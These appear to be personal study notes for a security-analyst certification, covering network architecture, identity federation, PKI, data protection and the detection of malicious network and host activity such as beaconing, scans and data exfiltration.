# Prerequisites
#### Network type's purpose

| Network Name | Description                                                                                                          |     |
| ------------ | -------------------------------------------------------------------------------------------------------------------- | --- |
| NAT          | Connect the VM to your real network, through a protected NAT                                                         |     |
| NAT Network  | Connect the VM and other VMs together on a protected network segment, which is also NAT’ed out to your real network. |     |
| Bridged      | Directly connects VM to the actual network of the PC (possibly allowing to get a DCHP address and being scanned)     |     |
| Internal     | Connects VM to network only for VMs                                                                                  |     |
| Host Only    | Connect the VM to network that only allows it to see the VM Host (PC)                                                |     |

---

#### Reading CVSS Score
> Common Vulnerability Scoring System

 CVSS Score Range:
- **0.0**: No severity
- **0.1 - 3.9**: Low severity
- **4.0 - 6.9**: Medium severity
- **7.0 - 8.9**: High severity
- **9.0 - 10.0**: Critical severity

These represent the  intrinsic  qualities of a vulnerability:

- **Attack Vector (AV)**: Indicates how the vulnerability can be exploited (e.g., Network, Adjacent, Local, Physical).
- **Attack Complexity (AC)**: Measures the difficulty of exploiting the vulnerability (Low or High).
- **Privileges Required (PR)**: Specifies the level of privileges an attacker needs (None, Low, High).
- **User Interaction (UI)**: Determines if user interaction is required for exploitation (None or Required).
- **Scope (S)**: Indicates whether the exploitation affects other components beyond the vulnerable one (Unchanged or Changed).
- **Confidentiality Impact (C)**: Assesses the impact on confidentiality (None, Low, High).
- **Integrity Impact (I)**: Assesses the impact on integrity (None, Low, High).
- **Availability Impact (A)**: Assesses the impact on availability (None, Low, High).

---

- **Beaconing** in cyber attacks refers to the periodic communication sent by a compromised device to an attacker's **command-and-control (C2) server**. This communication helps the attacker maintain control over the compromised device and receive updates or new instructions. Beaconing is a common tactic used in advanced persistent threats (APTs) and other sophisticated cyber attacks.

- **Probing** in cyber attacks refers to the technique used by attackers to gather information about a target system, network, or application. The main goal of probing is to identify vulnerabilities, open ports, services running on those ports, and other potential entry points that can be exploited in subsequent stages of an attack.

---
#### Privacy vs Security
Privacy instead of focusing on the way how an organization can protect it's own information, it focuses on the way that an organization can use and share information that it has collected about individuals. This data is known as *personally indentifiable information (PII)*, often regulatory standards and is always governed by ethical considerations.

Security focuses on three major components: Confidentiality, Integrity and Availability. These components' goals are to protect company's own data.

---
- A **vulnerability** is a weakness in a device, system, application, or process that might allow an attack to take place. They are due to internal factors that can be controlled by cybersecurity professionals.

- A **threat** in the world of cybersecurity is an outside force that may exploit a vulnerability.

- A **risk** is the combination of a threat and a corresponding vulnerability. Both of these factors must be present before a situation poses a risk to the security of an organization. 

Risk = Threat x Vulnerability

---
#### Threats
1. **Adversarial Threat:** individuals, groups, and organization deliberately undermining the security of company.
2. **Accidental Threat:** individuals when performing routine tasks mistakenly perform an action that undermines security.
3. **Structural Threat:** when equipment, software or environmental controls fails due to exhaustion of resources, exceeding their operational capability.
4. **Environmental Threat:** when natural or human-made disasters outside the control of organization occurs.

<img width="1421" height="422" alt="Pasted image 20240725194746" src="https://github.com/user-attachments/assets/5a40528d-ed22-4809-8247-417d5c0cd9b0" />


**Agent Based vs Agentless:** Agent-based solution requires software to be installed to communicated with the NAC service. While Agentless authentication is based on web.

**In-band vs Out-band:** **In-band means using the same network path as regular data traffic, while out-of-band uses a separate, dedicated channel**. Out-of-band methods offer enhanced security and reliability, especially during network outages, but can be more complex and costly.

#### NAC rules can be based on:
- time, location, system security health, role

---
#### Categories of Firewall
1. **Packet Filtering:** Checks the characteristics of packets against the firewall rules, found in routers.
2. **Next-Gen Firewalls (NGFW)**: includes contextual information about users, applications and business processes.
3. **Web App Firewall:** specialized firewalls designed for to protect against web app attacks.

---
#### Network Segmentation
The purpose of *jump server* is to act as a secure transition point between the corporate network and the datacenter network, providing a trusted path between the two zones.

System administrators who need to access the datacenter network should not connect devices directly to the datacenter network but should instead initiate an administrative connection to the jump box, using Secure Shell (SSH), the Remote Desktop Protocol (RDP), or a similar secure remote administration protocol.
<img width="755" height="631" alt="Pasted image 20240725231336" src="https://github.com/user-attachments/assets/677c79df-41fa-4fac-9b63-cf133606766f" />


---
**DNS sinkholes** feed false information to malicious software that works its way onto the enterprise network. When a compromised system attempts to obtain information from a DNS server about its command- and- control (C&C or C2) server, the DNS server detects the suspicious request and, instead of responding with the correct answer, responds with the IP address of a sinkhole system designed to detect and remediate the botnet- infected system.

---
If the **sandboxing** solution identifies strange behavior, it blocks the code from entering the organization’s network and flags it for administrator review. This process, also known as **code detonation**, is an example of an automated reverse engineering technique that takes action based on the observed behavior of software.

---
#### FaaS vs IaaS
| Feature         | FaaS                               | IaaS                                        |
| --------------- | ---------------------------------- | ------------------------------------------- |
| **Granularity** | Executes specific functions        | Provides full virtual machines              |
| **Management**  | Fully managed by provider          | Requires user management of OS, apps        |
| **Scaling**     | Auto-scales per function execution | Manual or automated scaling of VM instances |
| **Cost Model**  | Pay-per-execution                  | Pay for VM uptime                           |
FaaS could be particularly useful for automating routine tasks like **metadata extraction and anomaly detection**, while IaaS offers **full control for setting up forensic analysis environments**.

---
#### Ways to improve efficiency
- standardize recurring activities, we can simply turn to playbook for that standardized process and carry out the steps that you’ve already thought through.

---
**Webhooks** allow us to send a signal from one application to another using a web request. *For example, you might want to run a vulnerability scan every time your threat intelligence platform receives a report of a new vulnerability. In that case, you may be able to configure a webhook action in the threat intelligence platform that sends a request to the vulnerability scanner’s API each time a new vulnerability is reported. That request could trigger the desired scan.*

---
*Confidentiality* ensures that unauthorized individuals are not able to gain access to sensitive information. *Integrity* ensures that there are no unauthorized modifications to information or systems, either intentionally or unintentionally. *Availability* ensures that information and systems are ready to meet the needs of legitimate users at the time those users request them

---
# 1. SECURITY OPERATIONS
### 1.1 Explain the importance of system and network architecture concepts in security operations.
#### <u>OPERARTING SYSTEM CONCEPTS:</u>
- **System Hardening:** reducing the potential ways that an attacker could compromise or otherwise influence a system while retaining the functionality that is required of the system. *The Center for Internet Security (CIS)* provides a range of hardening guides and configuration benchmarks for common operating systems.

- **Windows Registry:** The Windows Registry is a database that contains operating system settings. Programs, ser vices, drivers, and the operating system itself all rely on information stored in the Registry, making it both a critical resource and a frequent target for malicious activity because it is very useful for persistence.

| Root Key                   | Description                                                              |
| -------------------------- | ------------------------------------------------------------------------ |
| HKEY_CLASSES_ROOT (HKCR)   | COM object registration information. Associates files type with programs |
| HKEY_LOCAL_MACHINE (HKLM)  | System information, including scheduled tasks and services               |
| HKEY_USERS (HKU)           | Information about user accounts                                          |
| HKEY_CURRENT_USER (HKCU)   | Information about the currently logged- in user                          |
| HKEY_CURRENT_CONFIG (HKCC) | Current local hardware profile information storage                       |

- **File Structure and File Locations:** [7 Default Windows Files and Folders You Should Never Touch (makeuseof.com)](https://www.makeuseof.com/tag/default-windows-files-folders/)
	Windows configuration information is often stored in the **Windows Registry**, although additional configuration information may be stored in the `C:\ProgramData\` or `C:\ Program Files\` directories as well as in the user’s `AppData` directory. 
	Linux configuration information is commonly stored in the `/etc/ directory`, although additional configuration information may be stored in other locations depending on the ser vice or program. 
	macOS often stores information in `~/Library/Preferences` and `/Library/ Preferences`

- **System Processes:** In Windows, the core system process is the **NT kernel**, which is found in `C:\Windows\ System32\notskrnl.exe` and always has a process ID of **4**. Other processes include the **Registry process**, **memory compression**, **session manager subsystem (smss.exe)**, **Windows subsystem process (crss.exe)**, **services control manager (services.exe)**, **Windows logon process (winlogon.exe)**, and the **Windows initialization process (wininit.exe)**, among others. [Windows System Processes — An Overview For Blue Teams | by Nasreddine Bencherchali | Medium](https://nasbench.medium.com/windows-system-processes-an-overview-for-blue-teams-42fa7a617920)

- **Hardware Architecture:** It’s worth noting that simply using an alternate hardware architecture isn’t a guarantee of safety. Attackers increasingly build malicious software to attack multiple hardware architec tures. Despite this, knowing what hardware architecture systems that you are responsible for and what that may mean as a defender and for attackers can help you manage your organization’s security posture.

---
#### <u>LOG INGESTION:</u>
- **Time Synchronization:** Time synchronization between systems and services is critical to log analysis. Events and incidents often result in logs in multiple locations or from multiple servers or services needing to be correlated. If time is not properly and accurately synchronized, events will not appear in the correct order or at the right times. This can lead to inaccurate assessments or misleading scenarios. *Network Time Protocol (NTP)* servers allow for easy time synchronization. That means that an important step for system administrators and security practitioners is to ensure that time synchronization is happening and that it is correct as part of regular reviews of systems and services before an event or issue occurs.

- **Logging Levels:** Security practitioners need to understand log levels and what setting a log level can mean for data capture. If your organization sets a logging level that doesn’t capture the data you need, you can miss important information. If you set an overly detailed log level, like log level 7, it can provide an overwhelming flood of detail that isn’t useful in most circumstances. <img width="1339" height="753" alt="Pasted image 20240727105407" src="https://github.com/user-attachments/assets/f2dee82a-3abc-4140-b594-bf1b2be3e33d" />


---
#### <u>INFRASTRUCTURE CONCEPTS:</u>
1. **Serverless:** Serverless computing in a broad sense describes cloud computing, but much of the time when it is used currently it describes technology sometimes called function as a service (FaaS). In essence, serverless computing relies on a system that executes functions as they are called. E.g. *Amazon’s AWS Lambda, Google’s App Engine, and Azure Functions*. Advantages: reduced cost as billed on usage rather than constant runtime, no maintenance and management cost, resources are dynamically allocated.

2. **Virtualization:** Virtualization uses software to run virtual computers on underlying real hardware. Can run multiple systems, running multiple operating systems, all of which act as if they are on their own hardware. This approach provides additional control of factors like resource usage and what hardware is presented to the guest operating systems, and it allows efficient use of the underlying hardware because can be leveraged shared resources. It is used to implement *virtual desktop infrastructure* (VDI). Challenges are: professionals must now determine how to monitor, secure and respond to virtual environment.

3. **Containerization:** Containerization provides an alternative to virtualizing an entire system and instead permits applications to be run in their own environment with their own required components, such as libraries, configuration files, and other dependencies, in a dedicated container. Kubernetes and Docker are examples of containerization technologies. Containerization is the process of packaging software with libraries and other dependencies that they need. This creates lightweight, portable containers that can be easily moved between environments while remaining less resource- hungry than a virtual machine since they use their host system. High level of portability but security challenges. There must be isolation between containers.

---
#### <u>NETWORK ARCHITECTURE:</u>
1. **On-Premises:** is composed of the routers, switches, security devices, cabling, and all the other network components that make up a traditional network. **Unified threat management (UTM)** devices that combine a number of services, often including firewalls, IDSs/IPSs, content filtering, and other security features.

2. **Cloud:** has not only driven the need for zero trust environments, but has also created a need for organizations to update their security practices for a more porous, more diverse operating environment. Unlike on- premises systems, the underlying environment provided by cloud service providers is not typically accessible to security practitioners to configure, test, or otherwise control. That means that securing cloud services requires a different approach. In addition, you may want to conduct a security assessment to determine whether the vendor meets your own expected security best practices. *Virtual private cloud (VPC)* is an option delivered by cloud service providers that builds an on- demand semi- isolated environment. A VPC typically exists on a private subnet and may have additional security to ensure that intersystem communications remain secure.

3. **Hybrid:** combines on-premises and cloud infrastructure and systems. This can introduce complexity as each distinct environment must be secured and have a security model that is appropriate to the entire infrastructure. Despite this, hybrid architectures are common as organizations migrate from on-premises datacenters to cloud services and cloud infrastructure as a service models while retaining some on-site services and systems.

4. **Network Segmentation:** Providing a layered defense often involves the use of segmentation, or separation. **Physical segmentation** involves running on separate physical infrastructure or networks. **System isolation** is handled by ensuring that the infrastructure is separated and can go as far as using an air gap, which ensures that there is no connection at all between the infrastructures. **Virtual segmentation** takes advantage of virtualization capabilities to separate functions to virtual machines or containers, although some implementations of segmentation for virtualization also run on separate physical servers in addition to running separate virtual machines. Network segmentation also frequently relies on routers and switches that support VLAN (virtual local area network) tagging. In addition to jump boxes, another common means of providing remote access as well as access into segmented networks from different security zones is through a virtual private network (VPN).<img width="1200" height="619" alt="Pasted image 20240727231537" src="https://github.com/user-attachments/assets/26c921cd-6dfe-458f-9190-59daada86af2" />


5. **Software-Defined Networking:** Using SDN, you can control networks centrally, which allows management of network resources and traffic with more intelligence than a traditional physical network infrastructure. Software-Defined networks provide information and control via APIs (application programming interfaces) like **OpenFlow**, which means that network monitoring and management can be done across disparate hardware and software vendors. In addition to organizationally controlled SDN implementations, *software-defined network wide area networks (SDN- WANs)* are an SDN- driven service model where providers use SDN technology to provide network services. Software‐defined networks (SDNs) consist of three major layers: **the application layer**, where information about the network is used to improve flow, configuration, and other items; **the control layer**, which is where the logic from SDN controllers control the network infrastructure; and **the infrastructure layer**, which is made up of the networking equipment.

6. **Zero Trust:** The zero trust concept removes the trust that used to be placed in systems, services, and individuals inside security boundaries. In a zero trust environment, each action requested and allowed must be verified and validated before being allowed to occur.

7. **Secure Access Service/Secure Edge (SASE):** Secure access service edge (SASE, pronounced “sassy”) is a network architecture design that leverages software- defined wide area networking (SD- WAN) and security functionality like cloud access security brokers (CASBs), zero trust, firewalls as a service, antimalware tools, or other capabilities to secure your network. The concept focuses on ensuring security at the endpoint and network layer, presuming that organizations are decentralized and that datacenter- focused security models are less useful in current organizations. 

---
#### <u>IDENTITY AND ACCESS MANAGEMENT</u>
Identities are used as part of the authentication, authorization, and accounting (AAA) framework that is used to control access to computers, networks, and services. AAA systems authenticate users by requiring credentials like a username, a password, and possibly a bio metric or token- based authenticator. Once individuals have proven who they are, they are then authorized to access or use resources or systems. The accounting element of the AAA process is the logging and monitoring that goes with the authentication and authorization. Accounting monitors usage and provides information about how and what users are doing.

1. **Multifactor Authentication (MFA):** *Knowledge factors* are something you know (passwords). *Possession factors* are something you have (NFC cards). *Biometric factors* are something you are (Fingerprint scan). *Location factors*, which are less frequently used, rely on physical location, determined either by where a system or network is located

2. **Passwordless:** In most implementa tions, this means that users enter a username or user ID, then use a USB token, authenticator application, or other device. Unlike MFA, passwordless authentication processes typically rely on a single factor that is designed to be more secure. *E.g. <mark style="background: #ADCCFFA6;">Magic Links</mark>: Links sent to the user's email that log them in when clicked, <mark style="background: #ADCCFFA6;">Push Notifications</mark>: Alerts sent to a registered mobile device that the user can approve or deny.*

3. **Single-Sign On (SSO):** Shared authentication schemes are somewhat similar to single sign- on and allow an identity to be reused on multiple sites while relying on authentication via a single identity provider. Shared authentication systems require users to enter credentials when authenticating to each site, unlike SSO systems. Common SSO technologies include the Lightweight Directory Access Protocol (LDAP) and the Central Authentication Service (CAS). SSO is popular due to the potential cost savings from fewer password resets and support calls. SSO may also make it easier for an attacker to exploit additional systems once they control a user’s browser or system, as the user will not be required to log in again.
	- **OpenID**, an open source standard for decentralized **authentication**. OpenID is broadly used by major websites like Google, Amazon, and Microsoft. Users create credentials with an identity provider like Google; then sites (relying parties) use that identity. Users can choose their identity provider without the need for predefined trust agreements between providers and relying parties. It is decentralized.
	- **OAuth**, an open **authorization** standard. OAuth is used by Google, Microsoft, Facebook, and other sites to allow users to share elements of their identity or account information while authenticating via the original identity provider. OAuth relies on access tokens, which are issued by an authorization server and then presented to resource servers like third- party web applications by clients. *E.g. You use an app that wants to post to your Twitter account. The app redirects you to Twitter, where you log in and authorize the app to post on your behalf. The app gets an access token that it can use to post tweets without knowing your Twitter password.*
	- **OpenID Connect** is an authentication layer built using the OAuth protocol.
	- **Facebook Connect**, also known as Login with Facebook, is a shared authentication system that relies on Facebook credentials for authentication.

4. **Federation:**  refers to a system where multiple organizations or systems establish trust relationships to allow users to access resources across these organizations with a single set of credentials. Primarily used in enterprise environments for cross-domain access. Requires predefined trust relationships and agreements between entities.
	**Members of Federated security:**
	- *identity provider (IdP):* trusted entity that creates, maintains, and manages identity information for users and provides authentication services to relying parties (RPs) within a federated network.
	- *relying party (RP) or service provider (SP):* an entity or application that relies on an Identity Provider (IdP) to authenticate users. The RP trusts the IdP to provide accurate and secure identity assertions, which it uses to grant access to its resources and services. 
	- The *consumer* or user of federated services may be asked to make decisions about attribute release and to provide validation information about their identity claims to the IDP.<img width="812" height="474" alt="Pasted image 20240730001337" src="https://github.com/user-attachments/assets/a44995b2-fec6-40c3-a9cf-4d2861c82d69" />

	- Four major technologies serve as the core of federated identity for current federations: SAML, AD FS, OAuth, and OpenID Connect.
	- **SAML:** is an XML- based language used to send authentication and authorization data between identity providers and service providers. It is frequently used to enable single sign-on for web applications and services because SAML allows identity providers to make assertions about principals to service providers so that they can make decisions about that user. SAML allows authentication, attribute, and authorization decision statements to be exchanged.<img width="1178" height="725" alt="Pasted image 20240730002011" src="https://github.com/user-attachments/assets/117a3bb5-0920-418e-9538-131524c5beeb" />

	- **Active Directory Federation Services (AD FS)**: is the Microsoft answer to federation. ADFS provides authentication and identity information as claims to third- party partner sites. Partner sites then use trust policies to match claims to claims supported by a service, and then it uses those claims to make authorization decisions.
	- **OAuth:** The OAuth 2.0 protocol provides an authorization framework designed to allow third- party applications to access HTTP- based services. It was developed via the Internet Engineering Task Force (IETF) and supports web clients, desktops, mobile devices, and a broad range of other embedded and mobile technologies, as well as the service providers that they connect to. OAuth provides access delegation, allowing service providers to perform actions for you. **Clients**: The applications that users want to use. **Resource Owners**: The end users **Resource Servers:** Servers provided by a service that the resource owner wants the application to use **Authorization Servers:** Servers owned by the identity provider.
	- **OpenID Connect:** is often paired with OAuth to provide authentication. It allows the authorization server to issue an ID token in addition to the authorization token provided by OAuth. This allows services to know that the action was authorized and that the user authenticated with the identity provider.

5. **Privileged Access Management (PAM):** describes the set of technologies and practices that are used to manage and secure privileged accounts, access, and permissions for systems, users, and applications through an organization. PAM relies on the principle of least privilege— the least amount of rights required to accomplish a task or role is what should be granted. PAM helps to address a number of common issues, including over-provisioning of privileges, life cycle management and prevention of privilege creep associated with privileges being retained as users change jobs and roles, the use of embedded or hard- coded credentials, and similar problems.

6. **Cloud Access Security Broker:** CASB tools are policy enforcement points that can exist either locally or in the cloud, and they enforce security policies when cloud resources and services are used. CASBs can help with data security, antimalware functionality, service usage and access visibility, and risk management. As you might expect with powerful tools, a CASB can be very helpful but requires careful configuration and continued maintenance.

---
#### <u>ENCRYPTION</u>
1. **Public Key Infrastructure (PKI):** is used to issue cryptographic certificates that are used for encryption, user and service authentication, code signing, and other purposes. PKI relies on asymmetric encryption to provide confidentiality, integrity, and to authenticate that a user or entity is who they claim to be. Five major components of PKI:
	- **A certificate authority (CA)**, which creates, stores, and signs certificates.
	- **A registration authority (RA)**, which verifies that entities requesting certificates are who they claim to be.
	- A directory that stores keys.
	- A certificate management system that supports access to and delivery of certificates.
	- A certificate policy that states the practices and procedures the PKI uses and which is used to validate the PKI’s trustworthiness.
	- Another key concept for PKI use is certificate revocation. Certificates include a variety of information, including the location of a **CRL** or **certificate revocation list**. CRLs allow certificate authorities to invalidate certificates before their expiration dates if they are com promised or canceled. This helps ensure that certificates that can no longer be trusted can be revoked.

2. **Secured Socket Layer (SSL):** *NOTE: Despite being called SSL inspection, in modern use you’re technically inspecting TLS. Even though SSL has been replaced by TLS, the term SSL is still commonly used to describe the technology. In either case, old versions of SSL and TLS aren’t considered secure, so it’s important to ensure organizations are using modern, secure versions.*
	The Secure Sockets Layer (SSL) protocol and its successor, Transport Layer Security (TLS), are used to encrypt many types of network traffic. While you’re most likely to see them used to secure connections to web servers, TLS is used in many different places. Of course, encrypting traffic means that you can’t observe, monitor, and analyze it. That’s where SSL inspection devices and technologies come into play. SSL inspection requires the insertion of either a monitoring device for offline analysis or by intercepting HTTPS or other TLS connections, terminating them at the inspection device or system, then passing the connection along to the original destination. This allows the intermediary system to inspect traffic while keeping the traffic encrypted on both sides of the connection.

---
#### <u>SENSITIVE DATA PROTECTION</u>
1. **Data Loss Prevention (DLP):** work to protect data from leaving the organization or systems where it should be contained. A complete DLP system targets data in motion, data at rest and in use, and endpoint systems where data may be accessed or stored. DLP relies on identifying the data that should be protected and then detecting when leaks occur, which can be challenging when encryption is frequently used between systems and across networks. This means that DLP installations combine endpoint software and various means of making network traffic visible to the DLP system.

2. **Personally identifiable Information (PII):** is any information that could reasonably permit an individual to be identified, either by direct or by indirect methods. Common examples of PII include financial and medical records, addresses and phone numbers, and national or state identification numbers like Social Security numbers, passport numbers, and driver’s license numbers in the United States.

3. **Card Holder Data (CHD):** is credit card information, including the primary account number (PAN), the cardholder’s name, and the expiration date. Additional information known as sensitive authentication data includes the CVV or card verification code, the data contained in the magnetic stripe and chip, and a PIN code if one is used. CHD is often called PCI data after the Payment Card Industry’s PCI DSS standard.

*NOTE: Another common type of protected data that isn’t included in the exam objectives is protected health information (PHI)*

---
### 1.2 Given a scenario, analyze indicators of potentially malicious activity.
#### Events vs Incidents vs Alerts
**Events** are typically defined as observable events like an email or a file download. **Incidents** are often classified as a violation of a security policy, unauthorized use or access, denial of service, or other malicious actions that may cause harm. **Alerts** are sent when events cause notification to occur. Make sure you know how your organization describes events, incidents, and alerts to help prevent confusion.

---
#### Monitoring
1. **Router Based:** Router-based monitoring relies on routers or switches with routing capabilities to provide information about the flow of traffic on the network and the status of the network device itself. Since routers are normally placed at network borders or other internal boundaries, router- based monitoring can provide a useful view of traffic at those points. This information about traffic flow is often referred to as network flows. Capture flow technologies: NetFlow, sFlow, J-flow. After capturing data is sent to flow collectors. In addition to flow- based reporting, the Simple Network Management Protocol (SNMP) is commonly used to collect information from routers and other network devices and pro vides more information about the devices themselves instead of the network traffic flow information provided by flow- capture protocols. You can see who you called, what number they were at, and how long you talked. With flows, you can see the source, its IP address, the destination, its IP address, how many packets were sent, how much data was sent, and the port and protocol that was used, allowing a good guess about what application was in use.<img width="789" height="596" alt="Pasted image 20240808214148" src="https://github.com/user-attachments/assets/e6b47694-4321-4635-ad2b-0de35a43a694" />

2. **Active Monitoring:** Active monitoring techniques reach out to remote systems and devices to gather data. Unlike flows and SNMP monitoring, where data is gathered by sending information to collectors, active monitors are typically the <u>data gathering</u> location (although they may then forward that information to a collector). Active monitoring typically gathers data about availability, routes, packet delay or loss, and bandwidth.
	- **Pings:** Network data can also be acquired actively by using Internet Control Message Protocol (ICMP) to ping remote systems. This provides only basic up/down information, but for basic use, ICMP offers a simple solution.
	- **iPerf:** A tool that measures the maximum bandwidth that an IP network can handle. Public iPerf servers allow remote testing of link bandwidth in addition to internal band width testing. iPerf testing data can help establish a baseline for performance to help identify when a network will reach its useful limits.
	When significant network bandwidth utilization issues appear, this type of network monitoring data may be lost or delayed as higher- priority traffic is likely to be prioritized over monitoring data.

3. **Passive Monitoring:** Passive monitoring relies on capturing information about the network as traffic passes a location on a network link. In Figure 3.3, a network monitor uses a network tap to send a copy of all the traffic sent between endpoints A and B. This allows the monitoring system to capture the traffic that is sent, providing a detailed view of the traffic’s rate, protocol, and content, as well as details of the performance of sending and receiving packets. 

---
#### <u>NETWORK RELATED</u>
1. **Bandwidth Consumption:** Bandwidth consumption can cause service outages and disruptions of business functions, making it a serious concern for both security analysts and network managers. In a well- designed network, the network will be configured to use logging and monitoring methods that fit its design, security, and monitoring requirements, and that data will be sent to a central system that can provide bandwidth usage alarms.
2. **Beaconing:** Beaconing activity (sometimes a heartbeat) is activity sent to a C&C system as part of a bot net or malware remote control system and is typically sent as either HTTP or HTTPS traffic. Beaconing can request commands, provide status, download additional malware, or perform other actions. Since beaconing is often encrypted and blends in with other web traffic, it can be difficult to identify, but detecting beaconing behavior is a critical part of detecting mal ware infections. Detection of beaconing behavior is often handled by using an IDS or IPS with detection rules that identify known botnet controllers or botnet-specific behavior. In addition, using flow analysis or other traffic-monitoring tools to ensure that systems are not sending unexpected traffic that could be beaconing is also possible. This means that inspecting outbound traffic to ensure that infected systems are not resident in your network is as important as controls that handle inbound traffic.
3. **Unexpected Traffic Spikes:** Unexpected traffic on a network can take many forms: scans, sweeps, and probes; irregular peer- to- peer traffic between systems that aren’t expected to communicate directly; spikes in network traffic; activity on unexpected ports; or more direct attack traffic. Unexpected traffic can be detected by behavior- based detection capabilities built into IDSs and IPSs, by traffic- monitoring systems, or manually by observing traffic between systems.
	- **Baselines, or anomaly-based detection**, which require knowledge of what normal traffic is. Baselines are typically gathered during normal network operations. Once baseline data is gathered, monitoring systems can be set to alarm when the baselines are exceeded by a given threshold or when network behavior deviates from the baseline behaviors that were documented.
	- **Heuristics, or behavior-based detection**, using network security devices and defined rules for scans, sweeps, attack traffic, and other network issues.
	- **Protocol analysis**, which uses a protocol analyzer to capture packets and check for problems. Protocol analyzers can help find unexpected traffic, like VPN traffic in a network where no VPN traffic is expected, or IPv6 tunnels running from a production IPv4 net work. They can also help identify when common protocols are being sent over an uncommon port, possibly indicating an attacker setting up an alternate service port.
4. **Detecting Scans and Sweeps:** Scans, sweeps, and probes are typically not significant threats to infrastructure by them selves, but they are often a precursor to more focused attacks. Network scans are often easily detectable due to the behaviors they include such as sequential testing of service ports, connecting to many IP addresses in a network, and repeated requests to services that may not be active. More stealthy scans and probes can be harder to detect among the general noise of a network, and detecting stealthy scans from multiple remote systems on a system connected to the Internet can be quite challenging. **Fortunately**, most IDSs and IPSs, as well as other network security devices like firewalls and network security appliances, have built- in scan detection capabilities. Enabling these can result in a lot of noise, and in many cases there is little you can do about a scan. *Many organizations choose to feed their scan detection data to a security information management tool to combine with data from attacks and other events, rather than responding to the scans and probes directly.*
5. **Detecting and Finding Rogue Devices:**
	- **Valid MAC Address Checking** Uses hardware (MAC) address information provided to network devices to validate the hardware address presented by the device to a list of known devices.
	- **MAC Address Vendor Information Checking** Vendors of network equipment use a vendor prefix for their devices. This means that many devices can be identified based on their manufacturer.
	- **Network Scanning** Performed using a tool like nmap to identify new devices.
	- **Site Surveys** Involve physically reviewing the devices at a site either by manual verification or by checking wireless networks on-site.
	- **Traffic Analysis** Used to identify irregular or unexpected behavior.
	- **Wireless Rogue:** Wireless rogues can create additional challenges because they can’t always easily be tracked to a specific physical location. Fortunately, if the wireless rogue is plugged into your network, using a port scan with operating system identification turned on can often help locate the device.

---
#### <u>INVESTIGATING HOST-RELATED ISSUES</u>
1. **Processor Consumption and Monitoring:** Sudden spikes, or increased processor consumption in CPU usage on a system with otherwise consistent usage levels, may indicate new software or a process that was not previously active. Consistently high levels of CPU usage can also point to a DoS condition. Used alone, CPU load information typically will not tell the whole story, but it should be part of your monitoring efforts.
2. **Memory Consumption and Monitoring:** Most operating system level memory monitoring is focused on memory utilization or memory consumption, rather than what is being stored in memory. Most protective measures for memory-based attacks occur as part of an operating system’s built-in memory management or when code is compiled. Most organizations set memory monitoring levels for alarms and notification based on typical system memory usage and an “emergency” level when a system or application is approaching an out-of-memory condition. This can be identified by tracking memory usage during normal and peak usage and then setting monitoring thresholds, or levels where alarms or alerts will occur, based on that data.
3. **Drive Capacity Consumption and Monitoring:** Drive capacity monitoring typically focuses on specific capacity levels and is intended to prevent the drive or volume from filling up, causing an outage. Tools to monitor drive capacity consumption are available for all major operating systems, as well as centralized monitoring and management systems like System Center Operations Manager (SCOM) for Windows or Nagios for Linux. Microsoft Intune can also provide information about disk usage. Disk monitoring in real time can help prevent outages and issues more easily than a daily report since disks can fill up quickly.
4. **Filesystem Changes and Anomalies:** Monitoring in real time for filesystem changes can help to catch attacks as they are occurring. Tools like the open source Wazuh security platform provide file integrity monitoring that keeps an eye on files, permissions, ownership, and file attributes and then sends alerts based on that monitoring.
5. **System Resource Monitoring Tools:** Windows provides built-in resource and performance monitoring tools. *Resource Monitor*, or resmon, is the Windows resource monitor and provides easy visibility into the CPU, memory, disk, and network utilization for a system. In addition to utilization, its network monitoring capability shows processes with network activity, which TCP connections are open, and what services are associated with open ports on the system. *Performance Monitor*, or perfmon, provides much more detailed data, with counters ranging from energy usage to disk and network activity. It also supports collection from remote systems, allowing a broader view of system activity. For detailed data collection, perfmon is a better solution, whereas resmon is useful for checking the basic usage measures for a machine quickly.
6. Linux has a number of built-in tools that can be used to check CPU, disk, and memory usage. They include the following:
	- **ps** provides information about CPU and memory utilization, the time that a process was started, and how long it has run, as well as the command that started each process.
	- **top** provides CPU utilization under CPU stats and also shows memory usage as well as other details about running processes. top also provides interaction via hotkeys, including allowing quick identification of top consumers by entering A.
	- **df** displays a report of the system’s disk usage, with various flags providing additional detail or formatting.
	- **w** indicates which accounts are logged in. Although this isn’t directly resource-related, it can be useful when determining who may be running a process.
7. **Malware, Malicious Processes, and Unauthorized Software:** Detecting malware, malicious processes, and unauthorized software often relies on a handful of major methods:
	- *Central management tools* like Microsoft Endpoint Manager, which can manage software installation and report on installed software. It is important to note that unlike tools like resmon and perfmon, Endpoint Manager doesn’t monitor in real time.
	- *Antivirus and antimalware tools*, which are designed to detect potentially harmful software and files.
	- *Endpoint detection and response (EDR)*, which we will discuss in more depth later in this chapter, can help detect malicious files and behavior and allow responses that can stop attacks immediately.
	- *Software and file block listing*, which uses a list of disallowed software and files and prohibits its installation. This differs from antivirus and antimalware by potentially providing a broader list of prohibited files than only malicious or similar files.
	- *Application allow listing*, which allows only permitted files and applications on a system. In an environment with thorough allow list implementation, no files that were not previously permitted are allowed on a system.
	Most managed environments will use more than one of these techniques to manage the software and applications that are present on workstations, servers, and mobile devices.
8. **Abnormal OS Process Behavior:** Abnormal behavior observed in operating system processes can be an indicator of a rootkit or other malware that has exploited an operating system component. For Windows systems, a handful of built-in tools are most commonly associated with attacks like these, including cmd.exe, at.exe and schtasks.exe, wmic.exe, powershell.exe, net.exe, reg.exe, and sc.exe, and similar useful tools. Tools like Metasploit have built-in capabilities to inject attack tools into running legitimate processes. Finding these processes requires tools that can observe the modified behavior or check the running process against known good process fingerprints. Another common technique is to name rogue processes with similar names to legitimate operating system components or applications, or use DLL execution via rundll32.exe to run as services via svchost.
9. **Data Exfiltration:** Data exfiltration, or the unauthorized removal of data from systems and datastores, is a key indicator of potentially malicious activity. Malicious actors often seek data, either to allow them to conduct further attacks and compromises or as valuable artifacts that they can sell or make use of directly. Organizational data of all types is a major target for attackers. That means that security practitioners need to use tools and techniques that can detect and stop data exfiltration. At the same time, malicious actors attempt to conceal exfiltration activities through a range of methods, including using encryption, sending it via commonly used channels like HTTPS, or sending it through covert channels like tunneling through DNS requests or other services. Tools like EDR, IPS, and data loss prevention (DLP) systems all have a role to play when monitoring for and preventing data exfiltration. A layered defense along with appropriate data tagging and protection can all help defenders detect, prevent, or stop data exfiltration.
